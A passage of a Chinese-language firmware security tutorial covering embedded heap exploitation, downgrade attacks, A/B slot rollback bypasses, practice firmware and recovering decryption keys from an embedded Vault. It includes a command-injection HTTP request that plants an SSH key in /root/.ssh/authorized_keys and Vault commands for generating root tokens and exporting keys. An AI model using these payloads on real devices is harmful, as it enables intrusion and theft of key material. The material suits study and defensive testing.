在嵌入式 daemon 中，触发 heap metadata exploitation 最简单的方法往往不是“等待清理”，而是**触发协议自身的错误处理**：<sup>[[8]](#references)</sup>

- 发送畸形的后续 fragment，使 FSM 进入 **retry** 或 **error** 状态。
- 超过 retry 阈值，促使 daemon **重置 context** 并释放已损坏的 buffer。
- 利用这个可预测的 `free()` 触发 allocator 侧的 primitives，避免进程因无关原因崩溃。

这对于嵌入式 Linux 中的 **musl/uClibc/dlmalloc 类** allocator 尤其有用，因为破坏 chunk metadata 可以将 unlink/unbin 逻辑转化为写入 primitive。一种稳定的模式是破坏 **size field**，将 allocator 遍历引导至溢出 buffer 中布置的**伪造 chunk**，而不是立即破坏真实的 bin pointer 并导致进程崩溃。

## Binary Exploitation 和 Proof-of-Concept

为已确认的漏洞开发 PoC，需要深入了解目标架构，并使用较低级别的语言编程。嵌入式系统中很少启用 binary runtime protection，但如果存在，可能需要使用 Return Oriented Programming (ROP) 等技术。

### uClibc fastbin exploitation 说明（嵌入式 Linux）

- **Fastbin 与 consolidation：** uClibc 使用的 fastbin 与 glibc 类似。后续的大块 allocation 可能触发 `__malloc_consolidate()`，因此任何伪造的 chunk 都必须通过相关检查（size 合理、`fd = 0`，且周围的 chunk 被视为“in use”）。<sup>[[6]](#references)</sup>
- **ASLR 下的 non-PIE binary：** 如果启用了 ASLR，但主 binary 是 **non-PIE**，binary 内的 `.data/.bss` 地址就是稳定的。可以将目标区域设为一个看起来像有效 heap chunk header 的位置，让 fastbin allocation 落到 **function pointer table** 上。
- **让 parser 停止的 NUL：** 解析 JSON 时，payload 中的 `\x00` 可以停止解析，同时保留后续由攻击者控制的字节，以用于 stack pivot/ROP chain。
- **通过 `/proc/self/mem` 使用 shellcode：** ROP chain 可以调用 `open("/proc/self/mem")`、`lseek()` 和 `write()`，将可执行 shellcode 写入已知 mapping 并跳转到该位置。

## 用于 Firmware Analysis 的预配置操作系统

[AttifyOS](https://github.com/adi0x90/attifyos) 和 [EmbedOS](https://github.com/scriptingxss/EmbedOS) 等操作系统提供了预配置环境，用于 firmware 安全测试，并配备所需工具。

## 用于分析 Firmware 的预配置 OS

- [**AttifyOS**](https://github.com/adi0x90/attifyos)：AttifyOS 是一个旨在帮助你对物联网 (IoT) 设备进行安全评估和 penetration testing 的发行版。它提供预配置环境并预装所有必要工具，可为你节省大量时间。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS)：基于 Ubuntu 18.04 的嵌入式安全测试操作系统，预装了 firmware 安全测试工具。

## Firmware 降级攻击与不安全的更新机制

即使厂商对 firmware image 实施了加密签名检查，**版本回滚（降级）保护也经常缺失**。如果 boot 或 recovery loader 只使用内置公钥验证签名，却不比较待刷入 image 的*版本*（或单调计数器），攻击者就可以合法安装**仍带有有效签名的旧版易受攻击 firmware**，从而重新引入已修补的漏洞。<sup>[[4]](#references)</sup>

典型攻击流程：

1. **获取较旧的签名 image**
   * 从厂商的公开下载门户、CDN 或支持网站获取。
   * 从配套的移动/桌面应用中提取（例如 Android APK 中的 `assets/firmware/`）。
   * 从 VirusTotal、互联网档案馆、论坛等第三方存储库获取。
2. 通过任何暴露的更新渠道**上传或向设备提供 image**：
   * Web UI、移动应用 API、USB、TFTP、MQTT 等。
   * 许多面向消费者的 IoT 设备会暴露*未经身份验证*的 HTTP(S) endpoint，这些 endpoint 接受 Base64 编码的 firmware blob，在服务器端解码并触发 recovery/upgrade。
3. 降级后，利用在较新版本中已修补的漏洞（例如后来添加的 command-injection filter）。
4. 获得持久化后，可选择刷回最新 image 或禁用更新，以避免被发现。

### 示例：降级后实施 Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

在存在漏洞的（降级后的）固件中，`md5` 参数未经清理便直接拼接到 shell 命令中，因此可以注入任意命令（此处用于启用基于 SSH 密钥的 root 访问）。后续固件版本加入了基础字符过滤，但由于缺少降级保护，这项修复形同虚设。<sup>[[4]](#references)</sup>

### 从移动应用中提取固件

许多厂商会将完整固件映像打包在配套移动应用中，以便应用通过 Bluetooth/Wi-Fi 更新设备。这些软件包通常以未加密形式存储在 APK/APEX 的 `assets/fw/` 或 `res/raw/` 等路径下。使用 `apktool`、`ghidra` 等工具，甚至直接使用 `unzip`，即可提取已签名的映像，而无需接触实体硬件。<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot 设计中的仅限 updater 的防回滚绕过

一些厂商确实实现了防降级 **ratchet**，但只在 *updater* 逻辑中实现（例如通过 CAN 运行的 UDS routine、recovery command 或 userspace OTA agent）。如果 **bootloader** 后续只检查镜像签名/CRC，并信任分区表或 slot 元数据，仍然可以绕过回滚保护。<sup>[[7]](#references)</sup>

典型的薄弱设计：

- Firmware 元数据同时包含版本描述符和 **security ratchet** / 单调计数器。
- Updater 将镜像的 ratchet 与持久化存储中的值进行比较，并拒绝较旧的已签名镜像。
- Bootloader **不**解析该 ratchet，只在启动所选 slot 前验证 header、CRC 和签名。
- Slot 激活状态单独存储在分区表或每个 slot 的 generation counter 中，且**未通过加密方式绑定**到已验证固件的确切 digest。

这会在双 slot 系统中形成一种**验证一个镜像 / 启动另一个镜像**的原语。如果攻击者能让 updater 使用当前签名镜像将 slot B 标记为下次启动目标，并在重启前覆盖 slot B，bootloader 仍可能启动降级镜像，因为它只信任已经提交的 slot 元数据。

常见的滥用模式：

1. 将一份**当前签名**固件上传到被动 slot，并运行常规验证/切换流程，使布局将该 slot 标记为下一个活动 slot。
2. **暂不重启**。在同一会话中重新进入 slot 准备/擦除流程。
3. 利用过时的 boot-state 或 slot 选择逻辑，让 updater 擦除**刚刚被提升的同一个物理 slot**。
4. 将一份**较旧但仍有有效签名**的固件写入该 slot。
5. 跳过执行 ratchet 检查的验证流程，直接重启。
6. Bootloader 选择已提升的 slot，只验证签名/完整性，然后启动旧镜像。

逆向分析 A/B 更新实现时需要关注：

- Slot 选择是否基于**启动时标志**，且成功切换后未刷新。
- 类似 `prepare_passive_slot()` 的 routine 是否依据过时状态擦除 slot，而非依据**当前已提交布局**。
- 类似 `part_write_layout()` 的函数是否只递增**generation counter** / 活动标志，而不保存已验证镜像的 hash。
- Ratchet 检查是否只在 userspace 或 updater 代码中实现，而**未**在 ROM / bootloader / secure boot 阶段实现。
- 擦除或恢复流程是否会在 slot 内容被删除并重写后，仍将其标记为可启动。

### 评估更新逻辑的检查清单

* *update endpoint* 的传输/认证是否得到了充分保护（TLS + authentication）？
* 设备在刷写前是否会比较**版本号**或**单调防回滚计数器**？
* 镜像是否在 secure boot chain 内验证（例如由 ROM code 检查签名）？
* **Bootloader 是否执行与 updater 相同的 ratchet**，而不只是检查签名/CRC？
* Slot 激活元数据是否**绑定到已验证固件的 digest/version**，还是 slot 在提升后仍可被修改？
* Slot 切换成功后，设备是否会被强制重启，还是同一会话中仍能调用后续更新/擦除流程？
* Userland 代码是否执行额外的健全性检查（例如允许的分区映射、型号）？
* *部分*更新或*备份*更新流程是否复用相同的验证逻辑？

> 💡  如果缺少上述任意一项，该平台很可能容易受到回滚攻击。

## 用于练习的易受攻击固件

要练习发现固件中的漏洞，可以从以下易受攻击固件项目开始。

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## 从嵌入式 KMS/Vault 状态中恢复固件解密密钥

当更新镜像混合了少量明文元数据和大型高熵数据块时，在进行暴力破解前先检查容器：<sup>[[1]](#references)</sup>

- 使用 `hexdump`、`xxd`、`strings -tx`、`base64 -d` 和 `binwalk -E` 转储 headers、偏移量和行边界。
- `Salted__` 通常表示 OpenSSL `enc` 格式：接下来的 8 个字节是 salt，其余字节是密文。
- 解码后恰好为 `256` 字节的 Base64 字段，强烈暗示这是一个 RSA-2048 密文，用于封装随机固件密码/会话密钥。
- 同一文件中的分离式 PGP 材料通常只用于保护真实性；不要假定它是保密机制。

如果静态密钥搜索（`grep`、`strings`、PEM/PGP 搜索）无果，应逆向分析**实际解密流程**，而不只是搜索私钥：

- 反编译 updater / management binary，追踪谁读取加密数据块、哪个 helper/API 对其解封装，以及它请求的逻辑密钥名称。
- 在提取出的 root filesystem 中搜索 KMS 状态（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`），以及 unit 文件和 init 脚本。
- 将明文 `vault operator unseal ...`、恢复密钥、引导 token 或本地 KMS 自动解封脚本视为等同于私钥材料。

如果设备附带原始 Vault binary 和存储后端，重放该环境通常比重新实现 Vault 内部机制更容易：

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

在克隆的 KMS 上获得 root 权限后：

- 仅在隔离的克隆环境中将 transit keys 设为可导出：`vault write transit/keys/<name>/config exportable=true`
- 导出 unwrap key：`vault read transit/export/encryption-key/<name>`
- 使用 KMS 所用的确切填充/哈希组合尝试恢复的 RSA key。PKCS#1 v1.5 解密失败，以及默认 OAEP 解密失败，**并不能**证明 key 有误；许多基于 Vault 的流程使用 SHA-256 的 OAEP，而常见库默认使用 SHA-1。
- 如果 payload 以 `Salted__` 开头，在尝试 AES-CBC 解密前，准确复现供应商的 OpenSSL KDF（`EVP_BytesToKey`，旧款设备通常使用 MD5）。

这样一来，“加密固件”就变成了一个更通用的问题：**恢复设备端的操作密钥，然后离线复现确切的 unwrap + KDF 参数**。

## 培训与认证

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [使用 Claude 破解固件：高级水平的技能，初级水平的自主性](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [固件安全测试方法论](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [实用 IoT Hacking：攻击物联网的权威指南](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [利用废弃硬件中的 zero-day 漏洞——Trail of Bits 博客](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [一个价值 20 美元的智能设备如何让我访问你的家](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [现在你看见我：现在你被 Pwn 了](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 从充电端口连接器入手，利用 Tesla Wall Connector——第 2 部分：绕过防降级机制](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [让它闪烁：通过无线 OTA 利用 Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [在 QEMU 上 ROOT Tesla OS，第 1 部分：解包](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux 内核文档 - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [在 QEMU 上 ROOT Tesla OS，第 2 部分：调试与修复](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS 密码：弱 XOR 加密允许从 SPI Flash 中恢复密码（CVE-2026-40639）](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS 密码恢复工具](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — 硬件 Hacking 基础复习，第 2 部分](https://voidstarsec.com/blog/brushing-up-part-2)
- [15] [我们为何以及如何 Hacking Cypherock 硬件钱包：完整经过](https://www.darknavy.org/blog/how_and_why_we_hacked_cypherock_hardware_wallet_the_full_story/)
{{#include ../../banners/hacktricks-training.md}}
